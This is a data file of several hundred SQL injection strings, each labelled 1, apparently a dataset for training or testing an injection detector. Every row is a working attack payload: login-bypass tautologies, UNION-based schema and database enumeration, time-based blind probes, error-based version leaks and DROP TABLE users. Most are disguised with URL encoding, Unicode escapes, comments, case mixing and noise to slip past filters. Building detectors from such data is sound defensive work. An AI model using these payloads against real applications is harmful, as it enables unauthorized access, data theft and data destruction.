"WAitfoR          DeLAY          '0:0:5'----avw94owurtmu", 1
"admin%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271", 1
"'%09%09%09UNION%09%09%09SELECT%09%09%091,2,3--", 1
"' And 1<=1  OR 'b'='b'-- #cc6ULj09Vd02", 1
"%27%20union%20SELEct%20nULL,%20NulL,%20Null%20--%20", 1
"1)%20UNION/**/SELECT/**/1,database()%2c%33----%67ug3blqz%34da", 1
"1%27%20%20%%320or%2%30%20%20iF(sU%62STrINg(d%61TaBASE()%2c%20%20%2%301,%20%2%30%201)	= 'A',%20%20%20SL%45EP(5),%20%20%200)%20%20%2%30--", 1
";/**/SeLECT/**/PG_SleEP(5);/**/ OR 'b'='b'----oqe0v", 1
"%27%2%30%4fR%20%271%27%3D%271", 1
"%27%20AND%20extractva%6c%75e(1,concat(0x5c,versi%6fn()))-%2d", 1
";				SeLecT				Pg_SLEep(5);				--#ajhr2ej7sk1bkd", 1
"%27AND%2f*%0d%0%61%2a/%65xtractvalue(1,con%63%61t(0x5c,version()))--%0a", 1
";/*!12345*/SELECT%20pg_sleep(5);%20--", 1
"1' UNION %53%45LECT ta%62le_name,%20nul%6c, null FROM %69nf%6frmation_schem%61.tables --", 1
"%3B%20DROP%%320TABLE%20u%73ers%3B%20--#tx%73%36a%38zcr36", 1
"%25u0027%2F%2A%2A%2FOR%2F%2A%2A%2F%25u00271%25u0027%3D%25u00271--7yyui9q", 1
"1)/*!*/UNIoN SeLEct 1,datAbASE(),3--", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)<=%0a%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--%0d%0a", 1
";/**/SELECT pg_sleep(5); ----a6my9rl9bra", 1
"1' XOR substri%6eg(database%28%29, %31, 1) IN (1) 's'%20--#9lh23ldsl070rp", 1
";%u0020DROP%20T%41BLE%u0020user%73;%u0020--", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20 /*!*/AND 1=1--", 1
"'          UNION          SELECT          1,2,3----yzenn7m", 1
"1)/*!*/UNION SELECT 1,database(),3----pmpopv", 1
"; seLeCt pg_sleEp(5);  AND 'a'='a'----inkvhvnc5k07b", 1
"1)/*!*/uNion/**/sEleCT/**/1,daTABaSE(),3--", 1
"%27%20%20%20UNION%20%20%20SELECT%20%20%201%2C2%2C3--", 1
"1' UNION SE%4cEC%54 table_name,%20nu%6cl, %6eull FROM informa%74ion_sch%65ma.%74ables --", 1
"%u0027AND/*%0d%0a*/1=convert(int,@@version)--", 1
"", 1
"WAITFOR%09DELAY%09'0:0:5'--", 1
"test%27OR%271%27%3C%3D%271%27%2F%2A%0A%23bfjx3h5tsfquje5", 1
"' && (1=1)e%78trac%74value(1%2cc%6fncat(0x5c,versio%6e()))----ge90spdock8p5", 1
"admin%2%37%2%30OR%20%271%27%3%44%271", 1
"TESt%27%2f%2A%2a%2FoR%2F%2a%2A%2F%271%27%3d%271%27%2F%2A%2a%2f--%2f%2a%2A%2F", 1
"' OR '1'<='1", 1
"%27%2F%2A%2A%2FUNION%20SELECT%20null%2C%20null%2C%20null%20--%20--vpzrrh7dt", 1
"1%u0027%u0020oR%u0020If(suBSTRing(DataBAse(),%u00201,%u00201)=%u0027A%u0027,%u0020sleeP(5),%u00200)%u0020--", 1
"' OR EXISTS(SELECT 1 FROM users) # more_noise--#wp4zv", 1
"adMIn'o/*!*/R'1'='1/*%0d%0a*/", 1
";/*!12345*/SELECT pg_sleep(5);  OR 'b'='b'--", 1
"'/*!12345*/Or existS(seLEcT 1 fROm uSeRs)--#ey1jyb9icm0x", 1
"test' OR '1'<='1' /*#9dccl1a24dx", 1
"%27%2F%2A%2A%2FOR%2F%%32%41%2A%2F%2%371%2%37%3D%271", 1
"; sElECT Pg_sLEEP(5); --", 1
"%25u0027%25u0020UNION%25u0020SELECT%25u00201%2C2%2C3%25u0020%23%25u0020more_noise----4l0vjr943yvu", 1
"%27%20OR%20EXISTS%28SEL/**/ECT%201%20FROM%20users%29--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20 XOR (1)--", 1
"'/**/|| (1=1)1=1 --", 1
"'	aNd	ExTraCtvAlue(1,cONCAT(0X5c,VERSIon()))--", 1
";/**/SELECT/**/pg_sleep(5);/**/----u9dfod4", 1
"%27%20UNION%20SELE%43T%%3201,%32,3%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--", 1
"1)      Union      seleCt      1,DATABASe(),3--#14Q1SkIZ0gxldq", 1
"1'/%2a*/OR%2f**/ascii(su%62string(d%61tabas%65()%2c/*%2a/1,/**/1))/**/%3e/**/100/**%2f /*!*/AND 1=1--", 1
"' AND 1IN (1)1 --", 1
"' UNION SELECT null, null, null -- #8c2bfl", 1
";/*!12345*/DRoP tAbLe UsErS;  OR (1)--", 1
"%27%20OR%201%3d1%20 # more_noise--%20", 1
"'/**/OR%2f**/'%31'='1", 1
"' A%4e%44 1=co%6eve%72t(int,@@version)--", 1
"'XOR", 1
"EXISTS(SELECT%0a1%0aFROMusers)--#vguafr7jp", 1
"1' || (1LIKE1)ascii(substring(database(), 1, 1)) > 100 --", 1
"%27 X%4fR 1=1 --", 1
"'UNionseLEcT/*%0d%0a*/nUll,null,%0anUlL--", 1
"", 1
"1%u0027%u0020%4fR%u%3002%30ascii%28su%62st%72ing(da%74abase(),%u00201,%u00201))%u0020>%u0020%3100%u0020%2d-", 1
"admin' || (1=1)'1'>='1", 1
"' OR '1'='1 OR 'b'='b'", 1
"1))%u0020%u0020%u0020%u0020%u0020UNION%u0020%u0020%u0020%u0020%u0020SELECT%u0020%u0020%u0020%u0020%u00201,database(),3----2ctg9a0uz6", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20%20--%20random_noise--", 1
"1))     UNION     SELECT     1,database(),3--#aehlyk3", 1
"WAITFORDELAY/*%0a*/%270:0:5%27--%0d%0a", 1
"%27%20UNION%20sELECt%20NUlL,%20NulL,%20null%20--%20", 1
"test'OR%0a'1'='1'", 1
"/*", 1
"#obsisz7m6a2pev", 1
"1))UniOn/*%0A*/SELeCt", 1
"1,daTabase(),3--%0D%0a", 1
"%u0027%u0020AND%u00201%20=%09convert(int,@@version)----dqd5cms8yojijy", 1
"1%u%30%3027				UN%49ON				SELECT	%09		t%61b%6ce_name,	%09		n%75ll,%09			null				FROM				i%6eformati%6fn_schema.tables				--", 1
"test%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F%2F%2A", 1
"' AND 1=convert(int,@@version) /*!*/AND 1=1--", 1
"'/**/AND/**/extra%63%74value(%31,concat(0x5c,ve%72sion()))-%2d", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020 /*!*/AND 1=1--", 1
"test' O%52 '1'LIKE%27%31' /*--bcqogr1zsq7bk", 1
"%27%20OR%201%3D1%20--%20#qk98rhcaa2", 1
"1 AND 1=1--fwoinx1gvsw", 1
"1)        UNION        SELECT        1,database(),3--", 1
"test%27%20O/**/R%20%271%27%3E%3D%271%27%20%2F%2A--d18t7gn4qcy", 1
"1AND/*%0d%0a*/1IN/**/(1)1", 1
"1' Or iF(suBSTriNG(DaTabAse(), 1, 1)LIKe'a', SleEp(5), 0)  /*!*/AND 1=1----98agia8i", 1
"tESt%27%20OR%20%271%27%3D%271%27%20--%20", 1
"1%27UNION", 1
"SELECT/*%0a*/table_name,null,nullFROMinformation_schema.tables--", 1
"1' OR ascii(sub%73tring(data%62ase(%29%2c 1, %31)) > 100 --", 1
"' A%4eD 1%3dconver%74(int,@@ver%73ion)--", 1
"admi%6e%u00%327%u0020OR%%75002%30%u%300271%u00%327%3D%u00271%20/*!*/AND%201%3D1", 1
"'%09AND%091  =%091%09--%09", 1
"'XOR1=1--%0a", 1
"1))UNIONSELECT/*%0d%0a*/1,database(),3--", 1
"aDMIn' or '1'>='1", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/=/**/'s'/**/----ear1gdpd", 1
";  DROP  TABLE  users;   OR 'b'<='b'----yr2zi3", 1
"' oR ExiSTs(seleCt 1 frOm USerS)--", 1
"' AND 1=1 -- --ugks26v", 1
"1) UNION SELECT 1,database(),3 AND 'a'='a'--", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)%3D%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020%20#%20more_noise--", 1
"admin%27%20OR%20%271%27%3D%271%20OR%20(1)", 1
"%27%20O/**/R%201%3D1%20--%20", 1
"%u0027%u0020&&%u0020(1=1)extractvalue(1,concat(0x5c,version()))%u0020||%u0020(1=1)%u0027b%u0027=%u0027b%u0027--", 1
"1%27%2509%2509%2509%2509%2509%7C%7C%2509%2509%2509%2509%2509ascii%28substring%28database%28%29%2C%2509%2509%2509%2509%25091%2C%2509%2509%2509%2509%25091%29%29%2509%2509%2509%2509%2509%3E%2509%2509%2509%2509%2509100%2509%2509%2509%2509%2509--", 1
"1'%20%20%20%20OR%20%20%20%20IF(substring(database(),%20%20%20%201,%20%20%20%201)>  =  'a',%20%20%20%20SLEEP(5),%20%20%20%200)%20%20%20%20--", 1
"%%327%%320AND%201%3D1%20 O%52 'b%27='b'--%20", 1
"'or%0d%0a'1'>='1", 1
"", 1
"1))%u00%320U%4eION%%75002%30SELECT%u00201,databas%65%28),3--#r3qwz", 1
"%25u0027%2F%2A%2112345%2A%2FUNION%25u0020SELECT%25u0020null%2C%25u0020null%2C%25u0020null%25u0020--%25u0020--z2izic", 1
"tes%74%u0027%u0020O%52%u0020%u0027%31%u0027=%u00271%u0027%u0020--%u0020", 1
"'||/*%0d%0a*/(1=1)EXISTS(SEL/**/ECT1/*%0a*/FROMusers)--", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3 /*!*/AND 1=1--", 1
"'UniOnSeLeCtnull,%0D%0ANulL,nulL--", 1
"1'     OR     IF(substring(database(),     1,     1)%20=%20'a',     SLEEP(5),     0)     --", 1
"1%u0020AND%u00201 =	1", 1
"1%27%2%30UN%49ON%%320%53ELECT%20table_n%61me%2C%%320null%2C%20null%20FROM%20i%6eformation_sche%6da.ta%62les%20--", 1
"%27%20XOR%20EXISTS%28SELECT%201%20FROM%20users%29----yfx6wb4xm6", 1
"1/**/AND    1%09=	1#t23rg", 1
"'%09%09%09%09or%09%09%09%091LiKE1%09%09%09%09 # MORe_NoisE--%09%09%09%09", 1
"1%u0027%u0020%u0020OR%u0020%u0020IF(substring(database(),%u0020%u00201,%u0020%u00201)%u0020%u0020=%u0020%u0020%u0027a%u0027,%u0020%u0020SLEEP(5),%u0020%u00200)%u0020%u0020--", 1
"%27/**/OR/**%2f1%3D1/**/-%2d/*%2a/", 1
"%27		OR		EXISTS(SELECT		1		FROM		users)--", 1
"%27%20OR%201%3D1%20--%20#bz%62oo%785esd5%72jr%71", 1
"1%27%20%26%26%%320sUBstRiN%67%%328daTAba%73e%28%29%2C%201%2%43%201%29%20%3D%2%30%27S%2%37%20--", 1
"WAITFOR DELAY '0:0:5' AND 'a'='a'--#zzzty", 1
"'%09UNION%09SELECT%09null,%09null,%09null%09--%09", 1
"; DROP TABLE users;  /*!*/AND 1=1--", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables ----4rybk167kymng0", 1
"1))%%750020%55N/**/ION%u0020%53EL%45CT%u00201,database(),3-%2d", 1
"WAITFO/**/R%09%09%09DELAY%09%09%09%270:0:5%27--", 1
"Test'/*!*/oR '1'='1'  # more_noise--", 1
"admin%27OR%2F%2A%250a%2A%2F%271%27%09%3D%20%271%2F%2A%250d%250a%2A%2F", 1
"' OR EXISTS(SELECT 1 FROM users)----hu7n8x48uf", 1
"1)/*!*/UNIO%4e SELECT 1,d%61ta%62ase()%2c3----uylr4", 1
"%u0027%u0020OR%u00201=1%u0020--%u0020", 1
"WAItfoR%20deLaY%20%270:0:5%27--#rNy4atKj", 1
"%27 uNiOn sEl%45cT nUll%2c nUlL,%20NUl%6c  -- RANDom_noISE-%2d", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3 OR (1)--", 1
"1)/*!12345*/UNIONSELECT/*%0a*/1,database(),3--", 1
"1'/*!*/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#qsip2vyzz48e", 1
"1)/*!12345*/UNION   SELECT   1,database(),3----iq48n1ani6y", 1
"aDmIn'or/*%0d%0a*/'1'%09=	'1", 1
"1))					UNION					SELECT					1,database(),3--", 1
"1/*!12345*/%41ND 1=1", 1
"1AND/*%0d%0a*/1=1/*%0a*/", 1
"%27OR%0a%271%27%3D%271/*%0d%0a*/#g0vi6m392r0bky6", 1
"tesT'     %6f%72     '1'%20=%09'%31'          OR     (1)--", 1
"WA%49TFOR%20DE%4cAY/*!*/'0:0:5'--", 1
"'aNDEXtRaCTVALUe(1,cONCat(0x5C,vERsiON()))--/*%0A*/", 1
"%27UN/**/IONSELECTnull%2Cnull%2Cnull%250d%250a--%2F%2A%250a%2A%2F", 1
"1%29)%2%30UNI%4fN%20seLECT%201,dAtaBase()%2c3--", 1
"1'/*!12345*/XOR substrin%67(%64atab%61se(), %31, %31) = 's' %20-- random_noise--", 1
"'oR1=1--%0d%0a", 1
"admin'OR/*%0a*/'1'='1/*%0a*/", 1
"1'%20%20%20%20%20||%20%20%20%20%20ascii(substring(database(),%20%20%20%20%201,%20%20%20%20%201))%20%20%20%20%20>%20%20%20%20%20100%20%20%20%20%20--#koufjtqo", 1
"'  AND  1%09= convert(int,@@version)--#96zursx2zst2", 1
"'/*!12345*/ AND  1  = 1   OR (1)--", 1
"'AND/*%0d%0a*/extractvalue(1,concat(0x5c,version()))--%0d%0a", 1
"%27%20%26%2526%20%281%3D1%291%3D%2531%20--%20", 1
"admin'%20%20OR%20%20'1'</**//**/=/**//**/'1/**/#/**/more_noise", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--#xxt8vtqh", 1
"1/**/AND%09%09%09%091	=%u00201", 1
"test%u0027%u0020OR%u0020%u00271%u0027%3D%u00271%u0027%u0020/*", 1
"' XOR '1'='1--uyx4sgrq", 1
"%25u0027%25u0020%25u0020%25u0020%25u0020UNION%25u0020%25u0020%25u0020%25u0020SELECT%25u0020%25u0020%25u0020%25u00201%2C2%2C3--", 1
"%u0027%u0020OR%u00201IN%u0020(1)1%u0020--%u0020", 1
"1'U%4eI%4fNSE%4cECTtable_name%2cnu%6c%6c,nullFR/*!*/OMinformation_sch%65%6da.tables--%0d%0a", 1
"' UNIO%4e S%45%4cECT null, null, nu%6cl --", 1
";%20%20%20%20%20SELECT%20%20%20%20%20pg_sleep(5);%20%20%20%20%20 OR (1)--", 1
"admin'/**/OR/**/'1'%20=%20'1", 1
"1%27%20ANd%20SubsTRing(dATAbAsE(),%201,%201)%20LIKE%20%27s%27%20--", 1
"'/*!*/   UNION    SELECT    null,    null,    null    --", 1
"admi%6e'/*%2a/OR%20'1'LIKE'1", 1
";SelEct/*%0d%0a*/Pg_SLeeP(5); AND 'a'='a'--", 1
"'/**/uniON/**/SElEcT/**/NuLl,/**/NUll,/**/NuLl/**/--/**/", 1
"%27%20unIoN%20SElect%20NUll,%20NULL,%20nuLl%20--%20", 1
"admIn'/**/or/**/'1'>	=  '1", 1
"'/**/OR/**/'%31%27='1", 1
"%25u0027%25u0020AND%25u00201%3E%3D1%25u0020--%25u0020", 1
"test%25u0027%25u0020%25u0020%25u0020%25u0020%25u0020%7C%7C%25u0020%25u0020%25u0020%25u0020%25u0020%281%09%3D%25091%29%25u00271%25u0027%09%3D%2509%25u00271%25u0027%25u0020%25u0020%25u0020%25u0020%25u0020--%25u0020%25u0020%25u0020%25u0020%25u0020", 1
"1%u0027			AND			substring(database(),			1,			1)			%u0020%u0020=%20			%u0027s%u0027			--", 1
";%20sELEct%20PG_sLeEP(5);%20--#kadkdfn4ytpf7", 1
"1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%20OR%20%27b%27%3D%27b%27--", 1
"1'%20%20%20UNION%20%20%20SELECT%20%20%20table_name,%20%20%20null,%20%20%20null%20%20%20FROM%20%20%20information_schema.tables%20%20%20%20%20%20#%20%20%20more_noise--", 1
"1))%20unIon%20SElEcT%201,DAtABasE(),3--", 1
"'    OR    EXISTS(SELECT    1    FROM    users)--", 1
"%u0027%09AND%091%20=%u0020%u00201%09--%09", 1
"%u0027UNIONSELECT%0anull,%0d%0anull,null%0a--", 1
"1'/*!*/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----xdaiw8d", 1
"test'/**/OR/**/'1'='1'/**//*/**/AND/**/'a'='a'", 1
"1))/*!12345*/UNION%u0020SELECT%u00201,database(),3--", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--%23qnqd7mare93q99", 1
"1' and SUBSTRinG(DAtabaSe(), 1, 1) = 's' --", 1
"; SELECT pg_sleep(5); ----5ises", 1
"WAITFOR%09%09%09DELAY%09%09%09'0:0:5'--#r8aiw", 1
"'/*!*/OR1=1/*%0d%0a*/--/*%0a*//*%0a*/", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020IN (1)%u0020%u0027s%u0027%u0020----n3xggdw", 1
"'%20%2%30%20%2%30%41nd%20%2%30%20%201%09%3D%%309COnVErt(Int,@@versIoN)--#ccp1qj0ouv", 1
"%27/*!12345*/%4fR%20%45XISTS(SELECT%201%20%46RO%4d%20users)--#nj%62bccrsk3gu3", 1
"1%27%20OR%20I%46%28subs%74ring%28database%28%29%2C%201%2C%201%29%3D%%327a%27%%32C%20SLEE%50%%3285%29%2%43%200%%32%39%20--", 1
"1%2f%2A%2a%2Fand%201%3d1", 1
"%25U0027%25U0020anD%25U00201%253DcOnveRt%28INt%2C%40%40veRsiOn%29--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#byps94b", 1
"'OR%0d%0aEXISTS(SELECT1/*%0a*/FROMusers)--", 1
"1) UnioN sELE%43T 1,datAbasE%28),3%2d-#ad14%7ay4whd%67l", 1
"'/*%21*/AND%201 = 1          --          #quz0mu0f7pzw", 1
"' aNd eXTRacTVAlue(1,COnCaT(0X5c,VERsiOn())) # more_noise--", 1
";DROP", 1
"TABLEusers;%0d%0a--/*%0d%0a*/#q5e4my3u", 1
"'%2f**/AND/**/1%3d1/**%2f--/**/", 1
"1 AND 1%3d1", 1
"1%u0027%u0020A/*!12345*/ND%u0020substring(database(),%u00201,%u00201)%u0020<=%u0020%u0027s%u0027%u0020--", 1
"%31%20AND%201%3D1", 1
"' UNI%4fN SELEC%54 1%2c2,3--", 1
"WAITFOR DELAY '0:0:5' OR (1)--", 1
"1%29%20uNION%20SElECT%201%2CDatABASE%28%29%2C3--", 1
"'or%0d%0a'1'='1", 1
"test%27/*!*/OR%20%271%27%3D%271%27%20--%20", 1
"1%20AND%201%3d1#7hGhOM39mljqH9", 1
"1 AND 1<=1", 1
"1AnD1>=1%0d%0a", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020%u0020AND%u0020%u0027a%u0027=%u0027a%u0027----81toropyg0n", 1
"1'/**/Or/**/if(SUBStriNg(DATAbAse(),/**/1,/**/1)='a',/**/SLEeP(5),/**/0)/**/----C5EQy09", 1
"1'/*!*/OR ascii(substring(database(), 1, 1)) > 100 --", 1
"admin%27%20OR%2%30%271%%327%%33D%271", 1
"'/*!12345*/OR EXISTS(SELECT 1 FROM users)--", 1
"%27%20AN%2544%201%253dconvert%2528int%2C%40%40versio%256e%29--", 1
"%27%20unIon%20SeLEcT%20nuLl%2C%20NulL%2C%20NUll%20--%20", 1
"'/**/AND/**/1=1/**/ OR 'b'='b'--/**/", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)%u0020OR%u0020(1)--", 1
"1)/**/UN/**/ION/**/SELECT/**/1,database(),3--#c3m25oc", 1
"1) UNION SELECT 1,database(),3 && (1LIKE1)'a'='a'--", 1
"'/**/Or/**/1=1/**/--/**/", 1
"%2%37%%320AND%201%%33Dconvert(int,@@version)%2d-", 1
"1%27AND%0asubstring(database(),1,1)%3D/*%0a*/%27s%27/*%0d%0a*/----11pwdcp", 1
"'OR%0a1 =	1%0d%0a--#znamchdl/*%0a*/", 1
"1) UNION SEL%45%43T 1,dat%61bas%65(),3--", 1
"test' OR '1'='1' -- --4oar6z4qefve3e", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3%u0020OR%u0020%u0027b%u0027=%u0027b%u0027----2dm2erejht8e", 1
"1%27%20U%4eION%20SEL%45CT%%320table_%6eame%2C%2%30nu%6cl%2C%20null%20FR%4fM%%320informa%74ion_schema.tables%20--", 1
"test%u0027%4fR%0a%u00271%u0027=%u00271%u0027", 1
"--/*%%30%64%0a*/", 1
"'/**/OR%20'1'='%31", 1
"'/**/AND/**/1=conv%65rt%28%69nt,@@version)%2d-", 1
"%27%20OR%20%271%27%3D%271--sl6hn4e0awep", 1
"1'    Or    AScii(SuBstrING(dATabase(),    1,    1))    >    100    --", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3 OR (1)--", 1
"test'  OR  '1'  =%09'1'  --", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--#087vkx92lmy0dx", 1
"1%u0027/*!12345*/OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020%3E%u0020100%u0020--", 1
"' AND 1=conve%72t%28in%74,@@versi%6fn)--", 1
"TEsT%27%20   oR    '1'%09=	'1'  %20 /*    or    'b'%0%39=	'%62%27", 1
"' OR '1'='1%2d%2dkrr4377c%78", 1
"%u0027/**/UNioN/**/SElECT/**/NUlL,/**/NULL,/**/NulL/**/--/**/", 1
"'/*!12345*%2fUNION%20SE%4c%45CT null, nul%6c, null --", 1
"W%41I%54FOR/*!*/  DE%4cAY   '0:0:5' OR (1)--", 1
"TesT'OR'1'lIKe'1'", 1
"--%0d%0a", 1
"'/**/anD/**/1=1/**/--/**/", 1
"'A/*!*/ND1IN (1)1%0d%0a--random_noise--", 1
"'   UNION   SELECT   null,   null,   null      --   random_noise--", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20--#pie49sjljk2xhv", 1
"' XOR '1'='1", 1
"test'/**/Or/**/'1'='1'/**//*", 1
"%27%20UNION%20SELECT%201%2C2%2C3%20OR%20%27b%27IN%20%281%29%27b%27--", 1
"1))%20UNioN%20seLect%201,daTaBAse(),3--", 1
"1%u0020AND%u00201IN (1)1", 1
";/*!*/SELECT%%320pg_sl%65%65p(5);%2%30--", 1
"1)UNION%0d%0aSELECT", 1
"1,database(),3--", 1
"'%20OR '1'>=%271", 1
"%3b/**/SE%4cECT pg_sle%65p%285); --#oeyhkm", 1
"%27/**/OR%271%27%3D%271%0d%0a--0ot99nmkca", 1
"'/*!12345*/aNd 1=1 --", 1
"1%u0027%u0020AND%u0020substrin%67(database(),%u00201,%201)%u0020<=%20%u0027s%u0027%u0020%2d-%2d-t6%7195c", 1
"waItfOr%20DeLAy%20%270:0:5%27--", 1
"' AND 1=convert(int,%40@v%65rsio%6e)-%2d", 1
"; SELECT pg_sleep(5);  -- random_noise--", 1
"adm%69n'O%52'1'<='1%0a", 1
"admin%27%20OR%20%271%27%3d%27%31", 1
"%27  A%4eD  1 >=  1%20 --", 1
"wAiTFOR Delay '0:0:5'----ng1y4p36te54p", 1
"1'O/**/R%0d%0aascii(substring(database(),1,1))>100%0a--%0d%0a", 1
"test%2%37%2%46%2A%2A%2FOR%2F%2%41%2A%2F%271%27%3D%%3271%27%2F%2%41%2A%2F--%%32F%2A%2A%2F", 1
"1'ANDsubstring(database(),1,1)LIKE/*%0d%0a*/'s'%0a--/*%0d%0a*/#m4ptmno", 1
";%20SE%4cECT%20pg_%73leep(5);%20%20#%20%6dore_noise%2d%2d", 1
"'/**/OR1=1/*%0a*/--/*%0a*/", 1
"1'/*!*/U%4eION SELE%43T table_n%61me%2c nu%6cl, null FROM information%5fschema.table%73%20--", 1
"1' UNION SELECT %74able%5fname, null, nul%6c FROM inf%6frmati%6fn_schema.%74a%62les -%2d", 1
"'/*!12345*/OR  1 =  1    /*!*/AND  1 =  1--  #etisyaqkdaej", 1
"%27%20UN/*!*/ION%20SELECT%20null,%20null,%20null%20--%20", 1
"'%20%20%20&&%20%20%20(1%20=  1)1%20=  1%20%20%20--%20%20%20", 1
"%27/*!*/UNION%20SELECT%201,2,3--#p17hdf", 1
"%27OR%0A%271%27%3D%271--random_noise%250a", 1
"1)) UNION SELECT 1,database(),3 -- random_noise--", 1
"1/*!*/AND	1  =%091", 1
"1%29%29%20UN/*!12345*/ION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"'AND/*%0a*/1 =  coNVeRt(InT,@@vERsion)--/*%0a*/#ds2y7qv3jpxl7kr", 1
"'/*!*/aNd/**/1=1%20-%2d/**/", 1
"'%20%20%20%20OR%%32%30%20%20%2%301=%%3091%20%20%20%20/*%0a*/AND'a'='a'--%20%20%2%30%20/*%0a*/", 1
"1' AND SubStRINg(DAtABase(), 1, 1) = 's' --", 1
"%u0027%u0020||%u0020(1%3D1)1%3D1%u0020--%u0020", 1
"%u0027%U0020XOr%u00201=CONvErT(INT,@@veRSion)--", 1
"%27unioNsEleCt%250d%250AnULl%2CnuLl%2C%0ANull--", 1
"1'/*!12345*/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  OR (1)--", 1
"%u0027/**/UNION%u%30020SELE%43T%u0020nul%6c%2c%%750020n%75ll,%u0020n%75ll%u0020--%u0020", 1
"WAITFORDELAY%0A%270%3A0%3A5%27--%2F%2A%250d%250a%2A%2F#af3ktjbpjanil1", 1
"' Or '%31%27='1", 1
"1) UnIoN seLECT 1,dAtaBaSe(),3----9zocysxw07", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20----gfzs4x2q", 1
"1))UNION%0d%0aSELECT1,database(),3--", 1
"%27%20%20%20%20%20%20%20%20%20%20AND%20%20%20%20%20%20%20%20%20%201%20%20%3D%091%20%20%20%20%20%20%20%20%20%20%20/*!*/AND%201%3D1--%20%20%20%20%20%20%20%20%20%20", 1
"'/**/aNd/**/eXtracTvALuE(1,cONCAt(0x5c,VeRsION()))--#5Wz8PJk1Y", 1
"1'				A/*!1%32%3345*/ND				substring%28database(),			%091,				1)				%09=					'%73'	%09%09	--#6fa18s3fryckd", 1
"1)UNIONSELECT1,database(),3--%0a", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020 XOR 'b'='b'--%u0020", 1
"'/*!*/OR '1'='1--7bytz7fn9i", 1
"1/*!12345*/AND 1=1", 1
"1' And substring(daTABAsE(), 1, 1) = 'S' --", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)--#tdrlw0", 1
"%27	%09	O%52			1%20%3D%091		%09--", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/=/**/'s'/**//*!12345*/# more_noise--", 1
"test%27OR", 1
"%271%27%3D%271%27--%0a", 1
"1)/**/UNION					SELECT					1,database(),3----v7mx1eg", 1
"'OR%0d%0aEXISTS(SELECT/*%0a*/1FROM%0d%0ausers)--", 1
"'%20%41ND 1=1 -- #%71czccu", 1
"1%2527%2520OR%2520ascii%28substring%28database%28%29%2C%25201%2C%25201%29%29%2520%253E%2520100%2520%20%23%20more_noise--", 1
";%09%09%09DROP%09%09%09TABLE%09%09%09users;%09%09%09--", 1
"1/**/AND 1<=1 OR (1)--cpsjv7z5", 1
"'/**/anD eXTractvALUE(1,cOnCAt(0X5c,VErsiON()))--#nxxqr45zxs", 1
"%27%20AND%201%3C%3Dconvert%28int%2C%40%40version%29----fp1h0svk", 1
"'AND%0aextractvalue(1,concat(0x5c,version())) /*!*/AND 1=1--", 1
"1%20aND%201%3D1", 1
"1'ORascii(substring(database(),%0d%0a1,", 1
"1))>/*%0d%0a*/100--", 1
"1%27%20XOR%20If(subsTRING(DAtABASe(),%201,%201)%3D%27a%27,%20sLEEP(5),%200)%20--#hwlaklw", 1
"'/**/AND/**/1=convert(int,@@version)--", 1
"t%65s%74%27%20OR%20%271%%327%3%44%271%27%20--%20", 1
"'A/*!12345*/ND/*%0A*/1=1%0a--/*%0A*/", 1
"1'%20anD%20suBsTRING(DatABAsE(),%201,%201)%20 LIKE %20's'%20--", 1
"1'/**//**//**//**/AnD/**//**//**//**/SUBSTRiNG(daTabASE(),/**//**//**//**/1,/**//**//**//**/1)/**//**//**//**/	=%09/**//**//**//**/'s'/**//**//**//**/--", 1
"%u0027/**/O%52/**/1%3d1/**/--/**/", 1
"1'/**/A/*!*/ND/**/substring(database(),/**/1,/**/1)/**/%20=%20/**/'s'/**/--", 1
"1%29%29%20%55NION%20SE%4cE%43T%201%2Cdatabase%2%38%%329%2C3--", 1
"1'/**/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#rno4lwnyblcovf", 1
"'/**/ANd/**/1	<=  1/**/--/**/", 1
"'OR/*%0a*/EXISTS(SELECT1FROMusers)--%0a", 1
"1)/*!*/unIon  select  1,dATaBASE(),3----3ypuuq2l25u", 1
"1%27%20A/**/nD%20substrING(DaTABAse(),%201,%201)%20%3D%20%27S%27%20--", 1
"admIn%27oR/*%0D%0%61*/'1'='%31", 1
"tESt%27%20Or%20%271%27%3D%271%27%20%2F%2A", 1
